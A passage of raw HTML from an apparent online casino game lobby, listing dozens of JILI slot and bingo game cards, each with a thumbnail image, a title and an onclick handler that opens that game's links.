                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/567161e4c1d7b1e23dc924605aee118f.webp?v=0.2" src="/assets/games/i/165x220/jili/567161e4c1d7b1e23dc924605aee118f.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mayan Empire">Mayan Empire</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="SevenSevenSeven" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'SevenSevenSeven', '/assets/games/i/165x220/jili/c0ae28903bd37e373595fb9a35ccb044.webp?v=0.2' , '27', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/c0ae28903bd37e373595fb9a35ccb044.webp?v=0.2" src="/assets/games/i/165x220/jili/c0ae28903bd37e373595fb9a35ccb044.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="SevenSevenSeven">SevenSevenSeven</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bubble Beauty" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bubble Beauty', '/assets/games/i/165x220/jili/f9361e17636def64d08fc37e54b4f43e.webp?v=0.2' , '30', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/f9361e17636def64d08fc37e54b4f43e.webp?v=0.2" src="/assets/games/i/165x220/jili/f9361e17636def64d08fc37e54b4f43e.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bubble Beauty">Bubble Beauty</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Land" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Land', '/assets/games/i/165x220/jili/7b9ed48a3114ebd75881fb8b62d0ea9b.webp?v=0.1' , '198', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/7b9ed48a3114ebd75881fb8b62d0ea9b.webp?v=0.1" src="/assets/games/i/165x220/jili/7b9ed48a3114ebd75881fb8b62d0ea9b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Land">Sweet Land</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fengshen" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fengshen', '/assets/games/i/165x220/jili/fffa9ca0c1fd92117d0d829b885840cc.webp?v=0.2' , '38', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/fffa9ca0c1fd92117d0d829b885840cc.webp?v=0.2" src="/assets/games/i/165x220/jili/fffa9ca0c1fd92117d0d829b885840cc.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fengshen">Fengshen</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Tree" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Tree', '/assets/games/i/165x220/jili/556cc4c49b153b149250045f8653b3f3.webp?v=0.1' , '6', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/556cc4c49b153b149250045f8653b3f3.webp?v=0.1" src="/assets/games/i/165x220/jili/556cc4c49b153b149250045f8653b3f3.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Tree">Fortune Tree</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Crazy FaFaFa" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Crazy FaFaFa', '/assets/games/i/165x220/jili/36b699c834ebfd794efc63f8e757a236.webp?v=0.1' , '40', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/36b699c834ebfd794efc63f8e757a236.webp?v=0.1" src="/assets/games/i/165x220/jili/36b699c834ebfd794efc63f8e757a236.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Crazy FaFaFa">Crazy FaFaFa</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Monkey" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Monkey', '/assets/games/i/165x220/jili/bf4a0130a8f07016a70e7a8d8383f241.webp?v=0.1' , '303', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/bf4a0130a8f07016a70e7a8d8383f241.webp?v=0.1" src="/assets/games/i/165x220/jili/bf4a0130a8f07016a70e7a8d8383f241.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Monkey">Fortune Monkey</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="XiYangYang" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'XiYangYang', '/assets/games/i/165x220/jili/ad719df4027ee7cb9838c4823a0dffc8.webp?v=0.1' , '43', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/ad719df4027ee7cb9838c4823a0dffc8.webp?v=0.1" src="/assets/games/i/165x220/jili/ad719df4027ee7cb9838c4823a0dffc8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="XiYangYang">XiYangYang</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Witches Night" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Witches Night', '/assets/games/i/165x220/jili/98ae4e65ba621660edd4cea985488c77.webp?v=0.2' , '226', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/98ae4e65ba621660edd4cea985488c77.webp?v=0.2" src="/assets/games/i/165x220/jili/98ae4e65ba621660edd4cea985488c77.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Witches Night">Witches Night</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Thor X" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Thor X', '/assets/games/i/165x220/jili/221e8d94add48a3334edbe326f663f3b.webp?v=0.2' , '130', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/221e8d94add48a3334edbe326f663f3b.webp?v=0.2" src="/assets/games/i/165x220/jili/221e8d94add48a3334edbe326f663f3b.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Thor X">Thor X</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="FortunePig" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'FortunePig', '/assets/games/i/165x220/jili/e5cf908e9e6125a52a455f0dbcf9ee2c.webp?v=0.2' , '33', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/e5cf908e9e6125a52a455f0dbcf9ee2c.webp?v=0.2" src="/assets/games/i/165x220/jili/e5cf908e9e6125a52a455f0dbcf9ee2c.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="FortunePig">FortunePig</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Golden Joker" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Golden Joker', '/assets/games/i/165x220/jili/5ed0d00b8f52c079cf144b1abe8a9618.webp?v=0.2' , '183', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/5ed0d00b8f52c079cf144b1abe8a9618.webp?v=0.2" src="/assets/games/i/165x220/jili/5ed0d00b8f52c079cf144b1abe8a9618.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Golden Joker">Golden Joker</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pirate Queen" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pirate Queen', '/assets/games/i/165x220/jili/818babf310cce8a802d4dc012c73035f.webp?v=0.2' , '164', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/818babf310cce8a802d4dc012c73035f.webp?v=0.2" src="/assets/games/i/165x220/jili/818babf310cce8a802d4dc012c73035f.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pirate Queen">Pirate Queen</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Book of Gold" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Book of Gold', '/assets/games/i/165x220/jili/0502a6bf8cc6e5eea6bd2d041be5d012.webp?v=0.2' , '87', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/0502a6bf8cc6e5eea6bd2d041be5d012.webp?v=0.2" src="/assets/games/i/165x220/jili/0502a6bf8cc6e5eea6bd2d041be5d012.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Book of Gold">Book of Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jungle King" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jungle King', '/assets/games/i/165x220/jili/e641db5774957b85d417c5fb592b201b.webp?v=0.2' , '16', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/e641db5774957b85d417c5fb592b201b.webp?v=0.2" src="/assets/games/i/165x220/jili/e641db5774957b85d417c5fb592b201b.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jungle King">Jungle King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fa Fa Fa" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fa Fa Fa', '/assets/games/i/165x220/jili/45d3ce8e177341fad23f742c70554b2c.webp?v=0.1' , '21', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/45d3ce8e177341fad23f742c70554b2c.webp?v=0.1" src="/assets/games/i/165x220/jili/45d3ce8e177341fad23f742c70554b2c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fa Fa Fa">Fa Fa Fa</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Golden Queen" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Golden Queen', '/assets/games/i/165x220/jili/5b03cbf3377de43d9ac33e59cc7d5261.webp?v=0.1' , '58', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/5b03cbf3377de43d9ac33e59cc7d5261.webp?v=0.1" src="/assets/games/i/165x220/jili/5b03cbf3377de43d9ac33e59cc7d5261.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Golden Queen">Golden Queen</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Coming" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Coming', '/assets/games/i/165x220/jili/2dff60b6597de1d851a7727c07aba72e.webp?v=0.1' , '91', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/2dff60b6597de1d851a7727c07aba72e.webp?v=0.1" src="/assets/games/i/165x220/jili/2dff60b6597de1d851a7727c07aba72e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Coming">Lucky Coming</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Golden Temple" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Golden Temple', '/assets/games/i/165x220/jili/fce2d7a4c3af1f4f8b60043c58dee79f.webp?v=0.1' , '191', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/fce2d7a4c3af1f4f8b60043c58dee79f.webp?v=0.1" src="/assets/games/i/165x220/jili/fce2d7a4c3af1f4f8b60043c58dee79f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Golden Temple">Golden Temple</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Shanghai Beauty" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Shanghai Beauty', '/assets/games/i/165x220/jili/cf930389d4ebc8bda4776eb39daf5449.webp?v=0.2' , '17', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/cf930389d4ebc8bda4776eb39daf5449.webp?v=0.2" src="/assets/games/i/165x220/jili/cf930389d4ebc8bda4776eb39daf5449.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Shanghai Beauty">Shanghai Beauty</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="God Of Martial" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'God Of Martial', '/assets/games/i/165x220/jili/3f7d486b63b3d69c98cae77b04a76c56.webp?v=0.1' , '4', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/3f7d486b63b3d69c98cae77b04a76c56.webp?v=0.1" src="/assets/games/i/165x220/jili/3f7d486b63b3d69c98cae77b04a76c56.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="God Of Martial">God Of Martial</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="RomaX" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'RomaX', '/assets/games/i/165x220/jili/bad755a2c721e2b227558c59911a59cc.webp?v=0.2' , '102', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/bad755a2c721e2b227558c59911a59cc.webp?v=0.2" src="/assets/games/i/165x220/jili/bad755a2c721e2b227558c59911a59cc.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="RomaX">RomaX</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Magic Lamp" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Magic Lamp', '/assets/games/i/165x220/jili/bf5f81839629bb6b1941790a8ccf7ec5.webp?v=0.1' , '108', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/bf5f81839629bb6b1941790a8ccf7ec5.webp?v=0.1" src="/assets/games/i/165x220/jili/bf5f81839629bb6b1941790a8ccf7ec5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Magic Lamp">Magic Lamp</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super Rich" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super Rich', '/assets/games/i/165x220/jili/1631a6ca26001d4e778804568c9b8e79.webp?v=0.1' , '100', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/1631a6ca26001d4e778804568c9b8e79.webp?v=0.1" src="/assets/games/i/165x220/jili/1631a6ca26001d4e778804568c9b8e79.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super Rich">Super Rich</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Medusa" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Medusa', '/assets/games/i/165x220/jili/b6d33f55bf1982492e62eed83a21349e.webp?v=0.2' , '101', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/b6d33f55bf1982492e62eed83a21349e.webp?v=0.2" src="/assets/games/i/165x220/jili/b6d33f55bf1982492e62eed83a21349e.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Medusa">Medusa</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Party Night" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Party Night', '/assets/games/i/165x220/jili/b300738158635fcb58506ec36609f29d.webp?v=0.2' , '76', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/b300738158635fcb58506ec36609f29d.webp?v=0.2" src="/assets/games/i/165x220/jili/b300738158635fcb58506ec36609f29d.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Party Night">Party Night</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Elf Bingo" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Elf Bingo', '/assets/games/i/165x220/jili/8dc8c64b09796e7538e86bf43c601572.webp?v=0.1' , '172', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/8dc8c64b09796e7538e86bf43c601572.webp?v=0.1" src="/assets/games/i/165x220/jili/8dc8c64b09796e7538e86bf43c601572.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Elf Bingo">Elf Bingo</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Samba" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Samba', '/assets/games/i/165x220/jili/2c0b46d5e23809f1ed77e5236e84ed51.webp?v=0.2' , '136', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/2c0b46d5e23809f1ed77e5236e84ed51.webp?v=0.2" src="/assets/games/i/165x220/jili/2c0b46d5e23809f1ed77e5236e84ed51.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Samba">Samba</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="War Of Dragons" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'War Of Dragons', '/assets/games/i/165x220/jili/2b0917e5540ec76d6a4f76f278620958.webp?v=0.1' , '9', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/2b0917e5540ec76d6a4f76f278620958.webp?v=0.1" src="/assets/games/i/165x220/jili/2b0917e5540ec76d6a4f76f278620958.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="War Of Dragons">War Of Dragons</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sin City" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sin City', '/assets/games/i/165x220/jili/cd366e66d804a5b09af155e5002b4dca.webp?v=0.2' , '171', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/cd366e66d804a5b09af155e5002b4dca.webp?v=0.2" src="/assets/games/i/165x220/jili/cd366e66d804a5b09af155e5002b4dca.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sin City">Sin City</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Candy Baby" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Candy Baby', '/assets/games/i/165x220/jili/b3415bc74a5872d49b0aa7fbfa97fcbb.webp?v=0.1' , '23', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/b3415bc74a5872d49b0aa7fbfa97fcbb.webp?v=0.1" src="/assets/games/i/165x220/jili/b3415bc74a5872d49b0aa7fbfa97fcbb.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Candy Baby">Candy Baby</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bone Fortune" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bone Fortune', '/assets/games/i/165x220/jili/ff573509c3dd43f0bffe5b8969741f61.webp?v=0.2' , '126', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/ff573509c3dd43f0bffe5b8969741f61.webp?v=0.2" src="/assets/games/i/165x220/jili/ff573509c3dd43f0bffe5b8969741f61.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bone Fortune">Bone Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Chin Shi Huang" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Chin Shi Huang', '/assets/games/i/165x220/jili/98505c5a10764dcdcd76b4c063df4250.webp?v=0.2' , '2', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/98505c5a10764dcdcd76b4c063df4250.webp?v=0.2" src="/assets/games/i/165x220/jili/98505c5a10764dcdcd76b4c063df4250.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Chin Shi Huang">Chin Shi Huang</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Happy Taxi" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Happy Taxi', '/assets/games/i/165x220/jili/48a7402d8c8cb8e7c15971eeaf375ea5.webp?v=0.2' , '116', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/48a7402d8c8cb8e7c15971eeaf375ea5.webp?v=0.2" src="/assets/games/i/165x220/jili/48a7402d8c8cb8e7c15971eeaf375ea5.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Happy Taxi">Happy Taxi</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Neko Fortune" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Neko Fortune', '/assets/games/i/165x220/jili/0825f316b22b03b897ffdc0179c4af55.webp?v=0.3' , '145', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/0825f316b22b03b897ffdc0179c4af55.webp?v=0.3" src="/assets/games/i/165x220/jili/0825f316b22b03b897ffdc0179c4af55.webp?v=0.3" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Neko Fortune">Neko Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cricket King 18" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cricket King 18', '/assets/games/i/165x220/jili/80ea3ec264cc2b92cb9a3ac204cedad6.webp?v=0.1' , '225', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/80ea3ec264cc2b92cb9a3ac204cedad6.webp?v=0.1" src="/assets/games/i/165x220/jili/80ea3ec264cc2b92cb9a3ac204cedad6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cricket King 18">Cricket King 18</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="TWIN WINS" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'TWIN WINS', '/assets/games/i/165x220/jili/b191a578f4231a4c7406b35a1128d946.webp?v=0.1' , '106', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/b191a578f4231a4c7406b35a1128d946.webp?v=0.1" src="/assets/games/i/165x220/jili/b191a578f4231a4c7406b35a1128d946.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="TWIN WINS">TWIN WINS</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="World Cup" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'World Cup', '/assets/games/i/165x220/jili/e67efc17976e4ce51bb796384cebdf4e.webp?v=0.2' , '146', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/e67efc17976e4ce51bb796384cebdf4e.webp?v=0.2" src="/assets/games/i/165x220/jili/e67efc17976e4ce51bb796384cebdf4e.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="World Cup">World Cup</h5>
        </a>
        
     
